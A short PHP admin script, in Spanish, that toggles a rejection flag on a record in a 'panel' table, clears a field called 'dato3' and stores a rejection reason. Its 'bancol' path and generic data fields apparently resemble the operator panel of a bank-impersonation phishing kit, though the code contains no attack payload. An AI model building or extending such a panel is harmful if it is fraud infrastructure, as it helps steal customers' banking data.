<?php
require_once '../bancol/config.php';

if (!isset($_SESSION['admin_logged_in'])) {
    die('Acceso no autorizado');
}

$conn = getConnection();
$uuid = $conn->real_escape_string($_GET['id']);
$reason = $conn->real_escape_string($_POST['reason'] ?? '');

$stmt = $conn->prepare("UPDATE  panel SET rejected_flag = NOT rejected_flag, dato3 = NULL, rejected_reason = ? WHERE id = ?");
$stmt->bind_param("ss", $reason, $uuid);
$stmt->execute();
$stmt->close();
$conn->close();

echo "Estado de rechazo actualizado";